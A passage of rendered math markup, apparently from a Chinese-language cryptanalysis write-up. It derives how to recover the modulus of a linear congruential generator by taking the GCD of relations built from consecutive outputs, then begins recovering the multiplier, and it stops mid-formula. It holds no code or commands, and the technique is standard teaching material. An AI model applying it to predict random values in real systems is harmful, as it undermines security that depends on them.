mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.09633em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2603300000000002em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:2.09633em;vertical-align:-0.8360000000000001em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">T</span></span><span class="mord">)</span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">{(T)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></span>中消去<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，去分母，得：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>4</mn></msub><mo>−</mo><msub><mi>x</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(R1’)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">(x_3-x_2)^2\equiv(x_4-x_3)(x_2-x_1) \pmod p \tag{R1&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">R</span><span class="mord">1</span><span class="mord">’</span></span><span class="mord">)</span></span></span></span></span></span></p><p>去掉同余号也就是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>4</mn></msub><mo>−</mo><msub><mi>x</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>D</mi><mn>1</mn></msub><mi>p</mi></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(R1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">(x_3-x_2)^2-(x_4-x_3)(x_2-x_1) =D_1p \tag{R1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span></span><span class="tag"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">R</span><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p><p>然后，由此可知：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>4</mn></msub><mo>−</mo><msub><mi>x</mi><mn>3</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>5</mn></msub><mo>−</mo><msub><mi>x</mi><mn>4</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>D</mi><mn>2</mn></msub><mi>p</mi></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(R2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">(x_4-x_3)^2-(x_5-x_4)(x_3-x_2) =D_2p \tag{R2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span></span><span class="tag"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">R</span><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p><p>因此，我们可以得到多个数据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>(R1)(R2)(R3)(R4)(R5)</mtext></mrow><annotation encoding="application/x-tex">\text{(R1)(R2)(R3)(R4)(R5)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(R1)(R2)(R3)(R4)(R5)</span></span></span></span></span>，然后计算所有结果得最大公因数就可以得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>。(一般7个值求出来的准确度就比较高了)</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>得到之后，我们根据消去<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>的式子，就可以计算出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>≡</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub></mrow></mfrac></mstyle><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a\equiv \dfrac{x_3-x_2}{x_2-x_1} \pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.09633em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2603300000000002em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span 